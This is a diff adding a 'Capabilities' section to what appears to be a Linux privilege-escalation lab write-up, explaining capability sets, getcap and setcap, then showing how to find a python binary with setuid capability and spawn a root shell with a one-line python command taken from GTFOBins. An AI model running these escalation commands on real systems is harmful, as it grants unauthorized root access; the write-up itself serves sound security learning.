@@ -590,3 +590,83 @@ and go to root shell by this command **`/usr/local/bin/suid-env2`**
 ![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 174025.png)
 
 we got root :)
+
+# Capabilities
+
+### **What Are Capabilities in Linux?**
+
+In Linux, **capabilities** are a fine-grained way of assigning specific privileges to processes. Traditionally, root (user ID 0) had all the powers on a system, while non-root users had very limited privileges. Capabilities allow splitting up the superuser's privileges into distinct units, which can be independently enabled or disabled for processes.
+
+### **How Capabilities Work:**
+
+- **Capabilities Are Attributes**: Instead of giving a process or binary full root privileges, you can assign it one or more capabilities, which allow it to perform specific privileged operations without requiring full root access.
+- **Capability Sets**: Each process in Linux has three sets of capabilities:
+    1. **Permitted Set**: Defines the capabilities that the process may assume.
+    2. **Inheritable Set**: Defines the capabilities that can be passed on to child processes.
+    3. **Effective Set**: Defines the capabilities that are actually in effect at any given moment.
+- **File Capabilities**: Executable files can also be assigned capabilities, allowing any process that runs them to inherit those specific capabilities.
+
+### **Common Capabilities:**
+
+- **CAP_NET_ADMIN**: Allows network-related operations, such as configuring interfaces.
+- **CAP_SYS_ADMIN**: A powerful capability that allows various system administration tasks.
+- **CAP_SETUID**: Allows setting arbitrary user IDs (UIDs).
+- **CAP_SYS_PTRACE**: Allows tracing any process, similar to `strace` or `gdb`.
+
+### **How to Manage and Check Capabilities:**
+
+### **Viewing Capabilities:**
+
+- **List Capabilities of a File:**Example:Output might show:This means the `ping` command has the `CAP_NET_RAW` capability enabled.
+    
+    ```bash
+    getcap /path/to/binary
+    ```
+    
+    ```bash
+    getcap /bin/ping
+    ```
+    
+    ```bash
+    /bin/ping = cap_net_raw+ep
+    ```
+    
+
+### **Assigning Capabilities:**
+
+- **Set Capabilities on a File:**
+    
+    ```bash
+    sudo setcap cap_net_raw+ep /path/to/binary
+    ```
+    
+    This command assigns the `CAP_NET_RAW` capability to the specified binary.
+    
+- **Remove Capabilities:**
+    
+    ```bash
+    sudo setcap -r /path/to/binary
+    ```
+    
+    This removes all capabilities from the specified binary.
+    
+
+### Explain It in Privilege Escalation :-
+
+we will search about Capabilities **`getcap -r / 2>/dev/null`**
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 175517.png)
+
+in this case will search in this website https://gtfobins.github.io/
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 175631.png)
+
+`./python -c 'import os; os.setuid(0); os.system("/bin/sh")'`
+
+we will used this command but not all because the python not run in this directory 
+
+`/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/sh")’`
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 180100.png)
+
+finally we got root :)
